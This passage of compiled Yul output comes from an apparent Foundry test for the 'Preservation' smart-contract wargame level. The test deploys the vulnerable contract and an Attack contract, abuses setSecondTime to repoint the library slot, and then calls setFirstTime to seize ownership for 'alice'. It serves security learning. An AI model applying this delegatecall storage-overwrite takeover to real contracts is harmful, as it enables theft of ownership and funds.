Preservation(address(timezone1), address(timezone2))\"\n                        let _16 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:1022:1078  \"new Preservation(address(timezone1), address(timezone2))\"\n                        let _17 := datasize(\"Preservation_23885\")\n                        let _18 := add(_16, _17)\n                        if or(gt(_18, /** @src 18:914:935  \"new LibraryContract()\" */ _7), /** @src 18:1022:1078  \"new Preservation(address(timezone1), address(timezone2))\" */ lt(_18, _16))\n                        {\n                            /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(224, 0x4e487b71))\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x41)\n                            revert(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, 36)\n                        }\n                        /// @src 18:1022:1078  \"new Preservation(address(timezone1), address(timezone2))\"\n                        datacopy(_16, dataoffset(\"Preservation_23885\"), _17)\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        mstore(_18, value)\n                        mstore(add(_18, /** @src 18:997:1007  \"vm.addr(1)\" */ 32), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ value_1)\n                        /// @src 18:1022:1078  \"new Preservation(address(timezone1), address(timezone2))\"\n                        let expr_address_2 := create(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 18:1022:1078  \"new Preservation(address(timezone1), address(timezone2))\" */ _16, add(sub(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _18, /** @src 18:1022:1078  \"new Preservation(address(timezone1), address(timezone2))\" */ _16), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _2))\n                        /// @src 18:1022:1078  \"new Preservation(address(timezone1), address(timezone2))\"\n                        if iszero(expr_address_2)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_3 := mload(_2)\n                            returndatacopy(pos_3, _4, returndatasize())\n                            revert(pos_3, returndatasize())\n                        }\n                        sstore(/** @src 18:1017:1078  \"pr = new Preservation(address(timezone1), address(timezone2))\" */ 0x08, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ or(and(sload(/** @src 18:1017:1078  \"pr = new Preservation(address(timezone1), address(timezone2))\" */ 0x08), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _10), and(expr_address_2, _9)))\n                        /// @src 18:1097:1109  \"new Attack()\"\n                        let _19 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:1097:1109  \"new Attack()\"\n                        let _20 := datasize(\"Attack_24220\")\n                        let _21 := add(_19, _20)\n                        if or(gt(_21, /** @src 18:914:935  \"new LibraryContract()\" */ _7), /** @src 18:1097:1109  \"new Attack()\" */ lt(_21, _19))\n                        {\n                            /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(224, 0x4e487b71))\n                            mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x41)\n                            revert(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, 36)\n                        }\n                        /// @src 18:1097:1109  \"new Attack()\"\n                        datacopy(_19, dataoffset(\"Attack_24220\"), _20)\n                        let expr_address_3 := create(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 18:1097:1109  \"new Attack()\" */ _19, sub(_21, _19))\n                        if iszero(expr_address_3)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_4 := mload(_2)\n                            returndatacopy(pos_4, _4, returndatasize())\n                            revert(pos_4, returndatasize())\n                        }\n                        sstore(/** @src 18:1088:1109  \"attack = new Attack()\" */ 0x0b, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ or(and(sload(/** @src 18:1088:1109  \"attack = new Attack()\" */ 0x0b), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _10), and(expr_address_3, _9)))\n                        return(mload(_2), _4)\n                    }\n                    case 0x1432159f {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let value_2 := and(sload(/** @src 18:699:731  \"LibraryContract public timezone1\" */ 9), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1))\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let memPos := mload(_2)\n                        mstore(memPos, value_2)\n                        return(memPos, 32)\n                    }\n                    case 0x1509c42a {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let value_3 := and(sload(/** @src 18:671:693  \"Preservation public pr\" */ 8), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1))\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let memPos_1 := mload(_2)\n                        mstore(memPos_1, value_3)\n                        return(memPos_1, 32)\n                    }\n                    case 0x3a768463 {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let memPos_2 := mload(_2)\n                        mstore(memPos_2, 0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)\n                        return(memPos_2, 32)\n                    }\n                    case 0x4d159fb9 {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let value_4 := and(sload(/** @src 18:737:769  \"LibraryContract public timezone2\" */ 10), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1))\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let memPos_3 := mload(_2)\n                        mstore(memPos_3, value_4)\n                        return(memPos_3, 32)\n                    }\n                    case 0x6f2db99c {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let _22 := sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1)\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let value_5 := and(sload(/** @src 18:1346:1348  \"pr\" */ 0x08), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _22)\n                        let value_6 := and(sload(/** @src 18:1379:1385  \"attack\" */ 0x0b), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _22)\n                        /// @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\"\n                        if iszero(extcodesize(value_5))\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            revert(_4, _4)\n                        }\n                        /// @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\"\n                        let _23 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\"\n                        mstore(_23, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ shl(226, 0x16f6a3e9))\n                        mstore(/** @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\" */ add(_23, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3), value_6)\n                        /// @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\"\n                        let _24 := call(gas(), value_5, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\" */ _23, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 36, /** @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\" */ _23, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4)\n                        /// @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\"\n                        if iszero(_24)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_5 := mload(_2)\n                            returndatacopy(pos_5, _4, returndatasize())\n                            revert(pos_5, returndatasize())\n                        }\n                        /// @src 18:1346:1388  \"pr.setSecondTime(uint160(address(attack)))\"\n                        if _24\n                        {\n                            finalize_allocation_4690(_23)\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            _4 := _4\n                        }\n                        let value_7 := and(sload(/** @src 18:1379:1385  \"attack\" */ 0x0b), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _22)\n                        let value_8 := and(sload(/** @src 18:1346:1348  \"pr\" */ 0x08), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _22)\n                        /// @src 18:1425:1446  \"pr.timeZone1Library()\"\n                        let _25 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:1425:1446  \"pr.timeZone1Library()\"\n                        mstore(_25, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ shl(225, 0x1ee3ca11))\n                        let _26 := 32\n                        /// @src 18:1425:1446  \"pr.timeZone1Library()\"\n                        let _27 := staticcall(gas(), value_8, _25, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3, /** @src 18:1425:1446  \"pr.timeZone1Library()\" */ _25, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _26)\n                        /// @src 18:1425:1446  \"pr.timeZone1Library()\"\n                        if iszero(_27)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_6 := mload(_2)\n                            returndatacopy(pos_6, _4, returndatasize())\n                            revert(pos_6, returndatasize())\n                        }\n                        /// @src 18:1425:1446  \"pr.timeZone1Library()\"\n                        let expr_1 := _4\n                        if _27\n                        {\n                            let _28 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _26\n                            /// @src 18:1425:1446  \"pr.timeZone1Library()\"\n                            if gt(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _26, /** @src 18:1425:1446  \"pr.timeZone1Library()\" */ returndatasize()) { _28 := returndatasize() }\n                            finalize_allocation(_25, _28)\n                            expr_1 := abi_decode_address_fromMemory(_25, add(_25, _28))\n                        }\n                        fun_assertEq(value_7, expr_1)\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let value_9 := and(sload(/** @src 18:1346:1348  \"pr\" */ 0x08), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _22)\n                        /// @src 18:1593:1611  \"pr.setFirstTime(1)\"\n                        if iszero(extcodesize(value_9))\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            revert(_4, _4)\n                        }\n                        /// @src 18:1593:1611  \"pr.setFirstTime(1)\"\n                        let _29 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:1593:1611  \"pr.setFirstTime(1)\"\n                        mstore(_29, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ shl(229, 0x078f0131))\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        mstore(/** @src 18:1593:1611  \"pr.setFirstTime(1)\" */ add(_29, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3), /** @src 18:1609:1610  \"1\" */ 0x01)\n                        /// @src 18:1593:1611  \"pr.setFirstTime(1)\"\n                        let _30 := call(gas(), value_9, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 18:1593:1611  \"pr.setFirstTime(1)\" */ _29, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 36, /** @src 18:1593:1611  \"pr.setFirstTime(1)\" */ _29, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4)\n                        /// @src 18:1593:1611  \"pr.setFirstTime(1)\"\n                        if iszero(_30)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_7 := mload(_2)\n                            returndatacopy(pos_7, _4, returndatasize())\n                            revert(pos_7, returndatasize())\n                        }\n                        /// @src 18:1593:1611  \"pr.setFirstTime(1)\"\n                        if _30\n                        {\n                            finalize_allocation_4690(_29)\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            if _4 { revert(_4, _4) }\n                        }\n                        let value_10 := and(sload(/** @src 18:1631:1636  \"alice\" */ 0x0c), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _22)\n                        let value_11 := and(sload(/** @src 18:1346:1348  \"pr\" */ 0x08), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _22)\n                        /// @src 18:1638:1648  \"pr.owner()\"\n                        let _31 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_2)\n                        /// @src 18:1638:1648  \"pr.owner()\"\n                        mstore(_31, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ shl(224, 0x8da5cb5b))\n                        /// @src 18:1638:1648  \"pr.owner()\"\n                        let _32 := staticcall(gas(), value_11, _31, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3, /** @src 18:1638:1648  \"pr.owner()\" */ _31, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _26)\n                        /// @src 18:1638:1648  \"pr.owner()\"\n                        if iszero(_32)\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            let pos_8 := mload(_2)\n                            returndatacopy(pos_8, _4, returndatasize())\n                            revert(pos_8, returndatasize())\n                        }\n                        /// @src 18:1638:1648  \"pr.owner()\"\n                        let expr_2 := _4\n                        if _32\n                        {\n                            let _33 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _26\n                            /// @src 18:1638:1648  \"pr.owner()\"\n                            if gt(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _26, /** @src 18:1638:1648  \"pr.owner()\" */ returndatasize()) { _33 := returndatasize() }\n                            finalize_allocation(_31, _33)\n                            expr_2 := abi_decode_address_fromMemory(_31, add(_31, _33))\n                        }\n                        fun_assertEq(value_10, expr_2)\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        return(mload(_2), _4)\n                    }\n                    case 0x9e5faafc {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let value_12 := and(sload(/** @src 18:775:795  \"Attack public attack\" */ 11), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1))\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let memPos_4 := mload(_2)\n                        mstore(memPos_4, value_12)\n                        return(memPos_4, 32)\n                    }\n                    case 0xba414fa6 {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let ret := fun_failed()\n                        let memPos_5 := mload(_2)\n                        mstore(memPos_5, iszero(iszero(ret)))\n                        return(memPos_5, 32)\n                    }\n                    case 0xf8ccbf47 {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let value_13 := and(shr(16, sload(_4)), 0xff)\n                        let memPos_6 := mload(_2)\n                        mstore(memPos_6, iszero(iszero(value_13)))\n                        return(memPos_6, 32)\n                    }\n                    case 0xfa7626d4 {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let value_14 := and(sload(_4), 0xff)\n                        let memPos_7 := mload(_2)\n                        mstore(memPos_7, iszero(iszero(value_14)))\n                        return(memPos_7, 32)\n                    }\n                    case 0xfb47e3a2 {\n                        if callvalue() { revert(_4, _4) }\n                        if slt(add(calldatasize(), not(3)), _4) { revert(_4, _4) }\n                        let value_15 := and(sload(/** @src 18:801:821  \"address public alice\" */ 12), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1))\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        let memPos_8 := mload(_2)\n                        mstore(memPos_8, value_15)\n                        return(memPos_8, 32)\n                    }\n                }\n                revert(0, 0)\n            }\n            /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n            function finalize_allocation_4690(memPtr)\n            {\n                if gt(memPtr, 0xffffffffffffffff)\n                {\n                    mstore(0, shl(224, 0x4e487b71))\n                    mstore(4, 0x41)\n                    revert(0, 0x24)\n                }\n                mstore(64, memPtr)\n            }\n            function finalize_allocation(memPtr, size)\n            {\n                let newFreePtr := add(memPtr, and(add(size, 31), not(31)))\n                if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr))\n                {\n                    mstore(0, shl(224, 0x4e487b71))\n                    mstore(4, 0x41)\n                    revert(0, 0x24)\n                }\n                mstore(64, newFreePtr)\n            }\n            function extract_returndata() -> data\n            {\n                switch returndatasize()\n                case 0 { data := 96 }\n                default {\n                    let _1 := returndatasize()\n                    if gt(_1, 0xffffffffffffffff)\n                    {\n                        mstore(/** @src -1:-1:-1 */ 0, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(224, 0x4e487b71))\n                        mstore(4, 0x41)\n                        revert(/** @src -1:-1:-1 */ 0, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x24)\n                    }\n                    let memPtr := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(64)\n                    /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                    finalize_allocation(memPtr, add(and(add(_1, 31), not(31)), 0x20))\n                    mstore(memPtr, _1)\n                    data := memPtr\n                    returndatacopy(add(memPtr, 0x20), /** @src -1:-1:-1 */ 0, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ returndatasize())\n                }\n            }\n            /// @ast-id 172 @src 0:1819:2403  \"function failed() public returns (bool) {...\"\n            function fun_failed() -> var\n            {\n                /// @src 0:1873:1880  \"_failed\"\n                let _1 := 0x00\n                /// @src 0:1869:2397  \"if (_failed) {...\"\n                switch /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ and(shr(8, sload(/** @src 0:1873:1880  \"_failed\" */ _1)), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 0xff)\n                case /** @src 0:1869:2397  \"if (_failed) {...\" */ 0 {\n                    /// @src 0:1941:1966  \"bool globalFailed = false\"\n                    let var_globalFailed := /** @src 0:1873:1880  \"_failed\" */ _1\n                    /// @src 0:2939:3043  \"assembly {...\"\n                    let _2 := 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D\n                    /// @src 0:1980:2354  \"if (hasHEVMContext()) {...\"\n                    if /** @src 0:3059:3075  \"hevmCodeSize > 0\" */ iszero(iszero(/** @src 0:2939:3043  \"assembly {...\" */ extcodesize(_2)))\n                    /// @src 0:1980:2354  \"if (hasHEVMContext()) {...\"\n                    {\n                        /// @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\"\n                        let expr_mpos := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(64)\n                        /// @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\"\n                        let _3 := 0x20\n                        /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                        mstore(/** @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\" */ add(expr_mpos, _3), /** @src 0:2939:3043  \"assembly {...\" */ _2)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        mstore(add(/** @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\" */ expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 64), /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(210, 0x19985a5b1959))\n                        /// @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\"\n                        mstore(expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 64)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        let newFreePtr := add(expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 96)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, expr_mpos))\n                        {\n                            mstore(/** @src 0:1873:1880  \"_failed\" */ _1, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(224, 0x4e487b71))\n                            mstore(4, 0x41)\n                            revert(/** @src 0:1873:1880  \"_failed\" */ _1, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ 0x24)\n                        }\n                        mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 64, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ newFreePtr)\n                        /// @src 0:2086:2261  \"abi.encodePacked(...\"\n                        let _4 := add(/** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ expr_mpos, /** @src 0:2086:2261  \"abi.encodePacked(...\" */ 128)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        mstore(_4, shl(228, 0x0667f9d7))\n                        let length := mload(expr_mpos)\n                        let i := /** @src 0:1873:1880  \"_failed\" */ _1\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        for { }\n                        lt(i, length)\n                        {\n                            i := add(i, /** @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\" */ _3)\n                        }\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        {\n                            let _5 := add(expr_mpos, i)\n                            mstore(add(_5, 132), mload(add(_5, /** @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\" */ _3)))\n                        }\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        if gt(i, length)\n                        {\n                            mstore(add(add(expr_mpos, length), 132), /** @src 0:1873:1880  \"_failed\" */ _1)\n                        }\n                        /// @src 0:2086:2261  \"abi.encodePacked(...\"\n                        let _6 := sub(/** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ add(expr_mpos, length), expr_mpos)\n                        /// @src 0:2086:2261  \"abi.encodePacked(...\"\n                        mstore(newFreePtr, add(_6, 4))\n                        finalize_allocation(newFreePtr, add(_6, 36))\n                        /// @src 0:2047:2279  \"HEVM_ADDRESS.call(...\"\n                        pop(call(gas(), /** @src 0:2939:3043  \"assembly {...\" */ _2, /** @src 0:1873:1880  \"_failed\" */ _1, /** @src 0:2047:2279  \"HEVM_ADDRESS.call(...\" */ _4, mload(newFreePtr), /** @src 0:1873:1880  \"_failed\" */ _1, _1))\n                        /// @src 0:2047:2279  \"HEVM_ADDRESS.call(...\"\n                        let expr_component_mpos := extract_returndata()\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        if slt(sub(/** @src 0:2312:2339  \"abi.decode(retdata, (bool))\" */ add(expr_component_mpos, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ mload(/** @src 0:2312:2339  \"abi.decode(retdata, (bool))\" */ expr_component_mpos)), expr_component_mpos), /** @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\" */ _3)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        {\n                            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                            revert(/** @src 0:1873:1880  \"_failed\" */ _1, _1)\n                        }\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        let value := mload(/** @src 0:2312:2339  \"abi.decode(retdata, (bool))\" */ add(expr_component_mpos, /** @src 0:2196:2239  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"))\" */ _3))\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        if iszero(eq(value, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ iszero(iszero(/** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ value))))\n                        {\n                            revert(/** @src 0:1873:1880  \"_failed\" */ _1, _1)\n                        }\n                        /// @src 0:2297:2339  \"globalFailed = abi.decode(retdata, (bool))\"\n                        var_globalFailed := value\n                    }\n                    /// @src 0:2367:2386  \"return globalFailed\"\n                    var := var_globalFailed\n                    leave\n                }\n                default /// @src 0:1869:2397  \"if (_failed) {...\"\n                {\n                    /// @src 0:1896:1910  \"return _failed\"\n                    var := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ and(shr(8, sload(/** @src 0:1873:1880  \"_failed\" */ _1)), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 0xff)\n                    /// @src 0:1896:1910  \"return _failed\"\n                    leave\n                }\n            }\n            /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n            function abi_decode_address_fromMemory(headStart, dataEnd) -> value0\n            {\n                if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n                let value := mload(headStart)\n                if iszero(eq(value, and(value, sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1))))\n                /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                {\n                    revert(/** @src -1:-1:-1 */ 0, 0)\n                }\n                /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                value0 := value\n            }\n            /// @ast-id 320 @src 0:3615:3892  \"function assertEq(address a, address b) internal {...\"\n            function fun_assertEq(var_a, var_b)\n            {\n                /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                let _1 := sub(shl(160, /** @src 18:914:935  \"new LibraryContract()\" */ 1), 1)\n                /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                let _2 := and(/** @src 0:3678:3684  \"a != b\" */ var_b, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _1)\n                let _3 := and(/** @src 0:3678:3684  \"a != b\" */ var_a, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _1)\n                /// @src 0:3674:3886  \"if (a != b) {...\"\n                if /** @src 0:3678:3684  \"a != b\" */ iszero(eq(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _3, _2))\n                /// @src 0:3674:3886  \"if (a != b) {...\"\n                {\n                    /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                    let _4 := 64\n                    /// @src 0:3705:3749  \"log(\\\"Error: a == b not satisfied [address]\\\")\"\n                    let _5 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_4)\n                    let _6 := 32\n                    mstore(_5, _6)\n                    mstore(add(_5, _6), 37)\n                    mstore(add(_5, _4), \"Error: a == b not satisfied [add\")\n                    mstore(add(_5, 96), \"ress]\")\n                    /// @src 0:3705:3749  \"log(\\\"Error: a == b not satisfied [address]\\\")\"\n                    log1(_5, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 128, /** @src 0:3705:3749  \"log(\\\"Error: a == b not satisfied [address]\\\")\" */ 0x41304facd9323d75b11bcdd609cb38effffdb05710f7caf0e9b16c6d9d709f50)\n                    /// @src 0:3768:3802  \"log_named_address(\\\"  Expected\\\", b)\"\n                    let _7 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_4)\n                    mstore(_7, _4)\n                    mstore(add(_7, _4), 10)\n                    mstore(add(_7, 96), \"  Expected\")\n                    mstore(add(_7, _6), _2)\n                    /// @src 0:3768:3802  \"log_named_address(\\\"  Expected\\\", b)\"\n                    let _8 := 0x9c4e8541ca8f0dc1c413f9108f66d82d3cecb1bddbce437a61caa3175c4cc96f\n                    log1(_7, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 128, /** @src 0:3768:3802  \"log_named_address(\\\"  Expected\\\", b)\" */ _8)\n                    /// @src 0:3821:3855  \"log_named_address(\\\"    Actual\\\", a)\"\n                    let _9 := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_4)\n                    mstore(_9, _4)\n                    mstore(add(_9, _4), 10)\n                    mstore(add(_9, 96), \"    Actual\")\n                    mstore(add(_9, _6), _3)\n                    /// @src 0:3821:3855  \"log_named_address(\\\"    Actual\\\", a)\"\n                    log1(_9, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 128, /** @src 0:3768:3802  \"log_named_address(\\\"  Expected\\\", b)\" */ _8)\n                    /// @src 0:2939:3043  \"assembly 